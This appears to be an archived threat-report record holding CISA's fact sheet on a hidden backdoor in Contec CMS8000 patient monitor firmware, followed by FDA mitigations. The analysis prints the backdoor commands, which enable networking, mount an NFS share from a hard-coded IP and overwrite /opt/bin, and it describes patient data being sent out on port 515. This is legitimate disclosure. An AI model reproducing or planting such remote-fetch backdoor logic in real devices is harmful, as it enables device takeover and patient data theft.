{
    "id": "55dde47a-c53e-4090-9938-23835ef49112",
    "created_at": "2025-02-02T02:05:04.620852Z",
    "updated_at": "2025-03-27T02:16:39.906817Z",
    "deleted_at": null,
    "sha1_hash": "d3797335f0479622479d26cecfbee23ce34162e5",
    "title": "Contec CMS8000 Contains a Backdoor",
    "authors": "",
    "file_creation_date": "2025-01-30T11:34:57Z",
    "file_modification_date": "2025-01-30T12:01:34Z",
    "file_size": 718827,
    "plain_text": "# Contec CMS8000 Contains a Backdoor\n\n\n## Introduction\n\nThe Cybersecurity and Infrastructure Security Agency (CISA) analyzed three versions of firmware for the\nContec CMS8000, a patient monitor used by the Healthcare and Public Health sector, and discovered an\n[embedded backdoor function with a hard-coded IP address, CWE – 912: Hidden Functionality](https://cwe.mitre.org/data/definitions/912.html) [(CVE-2025-](https://www.cve.org/CVERecord?id=CVE-2025-0626)\n[0626), and functionality that enables patient data spillage, CWE – 359: Exposure of Private Personal](https://www.cve.org/CVERecord?id=CVE-2025-0626)\n[Information to an Unauthorized Actor (CVE-2025-0683), exists in all firmware versions CISA analyzed. The](https://cwe.mitre.org/data/definitions/359.html)\nContec patient monitor CMS8000 (see Figure 1) is used in healthcare settings to monitor human vital\nsigns.\n\nCISA assesses the inclusion of this backdoor in the firmware of the monitor can create conditions which\nmay allow remote code execution and device modification with the ability to alter its configuration. This\nintroduces risk to patient safety as a malfunctioning monitor could lead to improper responses to vital\nsigns displayed by the device.\n\nPlease note the Contec CMS8000 may be re-labeled and sold by resellers. For a list of known re-labeled\n[devices, please refer to FDA’s safety communication, Cybersecurity Vulnerabilities with Certain Patient](https://www.fda.gov/medical-devices/safety-communications/cybersecurity-vulnerabilities-certain-patient-monitors-contec-and-epsimed-fda-safety-communication)\n[Monitors from Contec and Epsimed: FDA Safety Communication.](https://www.fda.gov/medical-devices/safety-communications/cybersecurity-vulnerabilities-certain-patient-monitors-contec-and-epsimed-fda-safety-communication)\n\n### Affected Device and Firmware Description\n\n_Figure 1: Contec CMS8000_\n\nContec Medical Systems is a global medical device and healthcare solutions company headquartered in\nChina. The company’s medical equipment is used in hospitals, clinics, and home healthcare environments\nin the European Union and the United States.\n\n_This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries minimal or_\n_no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard_\n_copyright rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic Light Protocol,_\n_i_ _g_ _/tl_\n\n\n-----\n\nThe company’s affected device, the Contec CMS8000, is used in medical settings to provide continuous\nmonitoring of a patient’s vital signs. The device tracks electrocardiogram, heart rate, blood oxygen\nsaturation, non-invasive blood pressure, temperature, and respiration rate.\n\nFollowing reporting of a vulnerability by an external researcher as part of CISA’s Coordinated Vulnerability\nDisclosure Process, the CISA research team tested three Contec firmware packages—(1) Version 2.0.6, (2)\na pre-release image with no known version number, and (3) a pre-release image of Version 2.0.8—to\nvalidate mitigation of the identified vulnerability. During this validation, the research team investigated\nanomalous network traffic that a security researcher provided to the team as part of vulnerability reporting.\nThe research team then discovered what resembles a reverse backdoor within all three of the firmware\npackages. The reverse backdoor provides automated connectivity to a hard-coded IP address from the\nContec CMS8000 devices, allowing the device to download and execute unverified remote files. Publicly\navailable records show that the IP address is not associated with a medical device manufacturer or\nmedical facility but a third-party university.\n\nBy reviewing the firmware code, the team determined that the functionality is very unlikely to be an\nalternative update mechanism, exhibiting highly unusual characteristics that do not support the\nimplementation of a traditional update feature. For example, the function provides neither an integritychecking mechanism nor version tracking of updates. When the function is executed, files on the device\nare forcibly overwritten, preventing the end customer—such as a hospital—from maintaining awareness of\nwhat software is running on the device. These types of actions and the lack of critical log/auditing data go\nagainst generally accepted practices and ignore essential components for properly managed system\nupdates, especially for medical devices.\n\n## Technical Details of Contec CMS8000 Backdoor\n\n### Backdoor Overview\n\nWhile the research team investigated the device firmware for the hard-coded IP addresses, they observed\na peculiar set of commands within the device firmware (see Figure 2):\n\n_Figure 2: Firmware Backdoor Code_\n\nIn the code in Figure 2, the device mounts a remote NFS share from a host at an IP address that is not\nregistered to the device manufacturer but is registered to a university. The research team did not observe\ncommunication to the university’s IP, only attempts by the device to reach out. As mentioned previously,\n\n\n2\n\n\n-----\n\nthe code lacks features commonly associated with update mechanisms. Manufacturers typically deliver\nfirmware updates in update packages, allowing them the ability to track precisely what software or\nfirmware version is installed on the device—which is essential in understanding the cybersecurity posture of\nthe device. It also provides the foundational information for regulatory tracking of the device’s reliability\nand safety.\n\nIn the function discovered by the research team, individual files are copied from the remote share to the\ndevice’s local filesystem. The copy mechanism automatically overwrites existing files on the device. No\nintegrity verification mechanism, such as code signing verification, is performed before the copy occurs.\nAdditionally, the copy command used by the function does not record which specific files are overwritten,\nversion changes between the existing file versions, or the files being copied from the remote file share.\nLastly, it is unusual that the remote file share is mounted via an IP address. Typically, remote access hosts\nfor vendor update mechanisms are referenced via DNS hostnames. If the remote file share is indeed a\nbackdoor, reference via IP address provides some deniability, as opposed to a DNS entry—which would\nestablish a formal tie between the DNS hostname registration and the infrastructure to which the DNS\nhostname points.\n\n### Technical Evaluation of Backdoor\n\nThe device runs several binaries and utilizes an ARM processor. One of the binaries used by the CMS8000\nis a binary named “monitor.” The research team observed a function making atypical calls to the\n“write_cmd” function within the monitor binary. Figure 3 shows the function found at offset 1A62E4.\n\n_Figure 3: Function at Offset 1A62E4_\n\nThe following code block within the monitor executable updates a graphical user menu. The monitor\napplication then issues the ifconfig eth0 up command via the built-in write_cmd function.\n```\nFillBox(local_1c,0,100,0x1c2,0x19);\nupdateRect._4_4_ = 0x55; \nupdateRect._12_4_ = 0x5f; \nupdateRect._8_4_ = 0x14;\nupdateRect._0_4_ = 0x1ae;\nupdateState = 1;write_cmd(“ifconfig eth0 up”);\n\n```\nThe ifconfig eth0 up command alters the network configuration for the device, activating the “eth0”\nnetwork device. eth0 is the name of a network interface commonly found on Linux and Unix-like operating\nsystems. (Note: Ethernet is the most common network function on the affected devices, though some\nmodels may have Wi-Fi or cellular connectivity.) After the eth0 network interface is activated, the monitor\n\n\n3\n\n\n-----\n\nbinary issues a “mount” command. The command is shown in the code snippet below (IP address\nredacted).\n```\nlocal_14 = write_cmd(“mount -o nolock -t nfs XXX.XXX.X.XXX:/pm /mnt”);\n\n```\nThe “-o nolock” option disables file locking over NFS. The lack of file locking supports various situations,\nincluding connecting to older NFS file servers or to read-only file shares. The “-t nfs” option specifies that\nthe remote file share is an NFS file share. The mount command then specifies that the /pm folder from the\nremote host will be mounted locally at /mnt. Although remotely mounting an NFS share in this manner\npresents several operational vulnerabilities (e.g., lack of built-in encryption and authentication), the\nresearch team discovered other relevant artifacts associated with the IP address.\n\nThe application then checks whether a file at /mnt/monitor exists. If a file exists, the application\ncontinues executing its logic. The application does not verify the file’s provenance or integrity; it simply\nchecks to see if it exists. The following code snippet shows the application checking for the presence of the\n```\n/mnt/monitor file: local_14 = access(“/mnt/monitor”,0).\n\n```\nIf the /mnt/monitor file exists, the application executes a “cp -rf” command, recursively copying all the\nfiles from the /mnt directory to the local device’s /opt/bin directory. The following code snippet shows\nthe application copying files from the remote NFS server: local_14 = write_cmd(“cp -rf /mnt/*\n```\n/opt/bin”). This code snippet is vital to security exposure, giving the target at the IP address control of\n\n```\nthe contents of /opt/bin and allowing it to overwrite any existing files. Additionally, given that the wildcard\noperator is passed to the copy command, the function does not identify exactly which files were copied,\nwhich files were overwritten, and which files or directories were newly created. The function also provides\nno integrity validation mechanism, nor does it track the specific versions of the files installed on the device.\nIn the code snippet below, the device copies the file at /opt/bin/start to /opt/startmonitor. Given\nthe copy command previously copied files from the remote share hosted by the university to the /opt/bin\ndirectory, the newly copied /opt/startmonitor file is subsequently assumed to be controlled by the\nuniversity.\n```\nlocal_14 = write_cmd(“cp -f /opt/bin/start /opt/startmonitor”);\n\n```\nThe device continues to copy various files, many from the /opt/bin directory to multiple places on the\ndevice’s local filesystem. After these files are copied, the device eventually unmounts the /mnt directory.\n```\nlocal_14 = write_cmd(“umount /mnt”);\n\n```\nThough the /opt/bin directory is not part of default Linux installations, it is nonetheless a common Linux\ndirectory structure. Generally, Linux stores third-party software installations in the /opt directory and thirdparty binaries in the /opt/bin directory. The ability to overwrite files within the /opt/bin directory\nprovides a powerful primitive for remotely taking over the device and remotely altering the device\nconfiguration. Additionally, the use of symbolic links could provide a primitive to overwrite files anywhere on\nthe device filesystem. When executed, this function offers a formidable primitive allowing for a third-party\noperating at the hard-coded IP address to potentially take full control of the device remotely.\n\nThroughout the vulnerability coordination process, two pre-release firmware patches were sent to CISA for\nanalysis by Contec. CISA received the original vendor patched firmware image on Nov. 9, 2024. The\nfirmware image received was not assigned an official version number to CISA’s knowledge. CISA received\n\n\n4\n\n\n-----\n\nthe second vendor patched firmware image, Version 2.0.8, on Dec. 17, 2024. The line that enables eth0\nwas removed from the second vendor patched firmware image as a partial means of mitigating the\nvulnerability originally reported by the external researcher.\n\nThis aspect of the mitigation does not impact the functionality of the backdoor due to the eth0 interface\nbeing explicitly enabled by the backdoor code before the external connection is established. The firmware\nimage originally received from the external researcher was Version 2.0.6 and was only a partial image. The\nimage did not contain the portion of the code where the interface eth0 start script would be located, so it\nis unknown whether the eth0 interface is enabled via the start script in that version. Even in the most\nrecent pre-release firmware image provided by the vendor, Version 2.0.8, the research team still found the\nbackdoor to be present (see Figure 4). The decompiled monitor binary from the Version 2.0.8 firmware\nupdate received from the vendor still contained the suspected backdoor code and functionality. Line 31\nenables the ethernet interface before the NFS code is called, despite the most recent patch explicitly\nleaving eth0 disabled. Line 32 shows the command used to connect to the remote NFS server and uses\nthe same IP address as all previously analyzed firmware versions.\n\n_Figure 4: Pre-release Version of Firmware 2.0.8 Maintaining Backdoor_\n\n### Patient Data Spillage\n\nWhen the CMS8000 completes its startup routine, it will automatically beacon to the same IP address that\nis hard-coded into the backdoor function. Once a connection is established, patient information is then\ntransmitted via port 515 to the IP address.\n\n\n5\n\n\n-----\n\nThe research team created a simulated network, created a fake patient profile, and connected a blood\npressure cuff, SpO2 monitor, and ECG monitor peripherals to the patient monitor. Upon startup, the patient\nmonitor successfully connected to the simulated IP address and immediately began streaming patient data\nto the address. Patient data is commonly transmitted across a network using the Health Level 7 (HL7)\nprotocol; this patient monitor transmitted it using port 515, which is designated as the Line Printer Daemon\n(LPD) protocol port. Once the data is interpreted from binary, patient data can be viewed as demonstrated\nin Figure 5. Sensor data from the patient monitor is also transmitted to the IP address in the same manner.\n\n_Figure 5: Decoded Patient Data Binary_\n\nIf the routine to connect to the hard-coded IP address and begin transmitting patient data is called, it will\nautomatically initialize the eth0 interface in the same manner as the backdoor. This means that even if\nnetworking is not enabled on startup, running this routine will enable networking and thereby enable this\nfunctionality.\n\n## Mitigations\n\n### FDA Recommendations for Patients and Caregivers\n\n  - Talk to your health care provider about whether your device relies on remote monitoring features.\nRemote monitoring means the device uses an internet connection to allow a health care provider to\nevaluate patient vital signs from another location (such as a remote monitoring system or central\nmonitoring system).\n\n  - If your health care provider confirms that your device relies on remote monitoring features, unplug\nthe device and stop using it. Talk to your health care provider about finding an alternative patient\nmonitor.\n\n  - If your device does not rely on remote monitoring features, use only the local monitoring features of\nthe patient monitor. This means unplugging the device’s ethernet cable and disabling wireless (that\nis, WiFi or cellular) capabilities, so that patient vital signs are only observed by a caregiver or health\ncare provider in the physical presence of a patient.\n\n  - If you cannot disable the wireless capabilities, unplug the device and stop using it. Talk to your\nhealth care provider about finding an alternative patient monitor.\n\n  - Know, the FDA is not aware of any cybersecurity incidents, injuries, or deaths related to this\nvulnerability at this time.\n\n  - Report any problems or complications with your Contec CMS8000 patient monitor to the FDA.\n\n\n6\n\n\n-----\n\n### FDA Recommendations for Health Care Providers\n\n  - Work with health care facility staff to determine if a patient’s Contec CMS8000 monitor may be\naffected and how to reduce any associated risk.\n\n  - Read and follow the recommendations for patients and caregivers in FDA’s safety communication.\n\n  - Check the Contec CMS8000 patient monitors for any signs of unusual functioning, such as\ninconsistencies between the displayed patient vitals and the patient’s actual physical state.\n\n  - Report any problems with your Contec CMS8000 patient monitor to the FDA.\n\n### FDA Recommendations for Health Care Facility Staff—including Information Technology (IT) and Cybersecurity Staff\n\n  - Use only the local monitoring features of the device.\n\n`o` If your patient monitor relies on remote monitoring features, unplug the device and stop using\nit.\n\n`o` If your device does not rely on remote monitoring features, unplug the device’s ethernet cable\nand disable wireless (that is, WiFi or cellular) capabilities. If you cannot disable the wireless\ncapabilities, then continuing to use the device will expose the device to the backdoor and\npossible continued patient data exfiltration.\n\n  - Be advised, at this time, there is no software patch available to help mitigate this risk.\n\n  - Check the Contec CMS8000 patient monitors for any signs of unusual functioning, such as\ninconsistencies between the displayed patient vitals and the patient’s actual physical state.\n\n  - Report any problems with your Contec CMS8000 patient monitor to the FDA.\n\n## Resources\n\nThe Food and Drug Administration (FDA) has provided information for potentially affected stakeholders\n[here, Cybersecurity Vulnerabilities with Certain Patient Monitors from Contec and Epsimed: FDA Safety](https://www.fda.gov/medical-devices/safety-communications/cybersecurity-vulnerabilities-certain-patient-monitors-contec-and-epsimed-fda-safety-communication)\n[Communication.](https://www.fda.gov/medical-devices/safety-communications/cybersecurity-vulnerabilities-certain-patient-monitors-contec-and-epsimed-fda-safety-communication)\n\n[1] [FDA: Postmarket Management of Cybersecurity in Medical Devices](https://www.fda.gov/regulatory-information/search-fda-guidance-documents/postmarket-management-cybersecurity-medical-devices)\n\n[2] [CISA: ICSMA-25-030-01 Contec Health CMS8000 Patient Monitor](https://www.cisa.gov/news-events/ics-medical-advisories/icsma-25-030-01)\n\n[3] [FDA: Cybersecurity Vulnerabilities with Certain Patient Monitors from Contec and Epsimed: FDA](https://www.fda.gov/medical-devices/safety-communications/cybersecurity-vulnerabilities-certain-patient-monitors-contec-and-epsimed-fda-safety-communication)\n\n[Safety Communication](https://www.fda.gov/medical-devices/safety-communications/cybersecurity-vulnerabilities-certain-patient-monitors-contec-and-epsimed-fda-safety-communication)\n\n## Disclaimer\n\nThe information in this report is being provided “as is” for informational purposes only. CISA does not\nendorse any commercial entity, product, company, or service, including any entities, products, or services\nlinked within this document. Any reference to specific commercial entities, products, processes, or services\nby service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement,\nrecommendation, or favoring by CISA.\n\n\n7\n\n\n-----\n\n## Version History\n\nJanuary 30, 2025\n\n\n8\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.cisa.gov/sites/default/files/2025-01/fact-sheet-contec-cms8000-contains-a-backdoor-508c.pdf"
    ],
    "report_names": [
        "fact-sheet-contec-cms8000-contains-a-backdoor-508c.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2864e40a-f233-4618-ac61-b03760a41cbb",
            "created_at": "2023-12-01T02:02:34.272108Z",
            "updated_at": "2025-03-27T02:02:10.209072Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "ETDA:WildCard",
            "tools": [
                "RustDown",
                "SysJoker"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "256a6a2d-e8a2-4497-b399-628a7fad4b3e",
            "created_at": "2023-11-30T02:00:07.299845Z",
            "updated_at": "2025-03-27T02:00:03.257794Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "MISPGALAXY:WildCard",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1738461904,
    "ts_updated_at": 1743041799,
    "ts_creation_date": 1738236897,
    "ts_modification_date": 1738238494,
    "files": {
        "pdf": "https://archive.orkl.eu/d3797335f0479622479d26cecfbee23ce34162e5.pdf",
        "text": "https://archive.orkl.eu/d3797335f0479622479d26cecfbee23ce34162e5.txt",
        "img": "https://archive.orkl.eu/d3797335f0479622479d26cecfbee23ce34162e5.jpg"
    }
}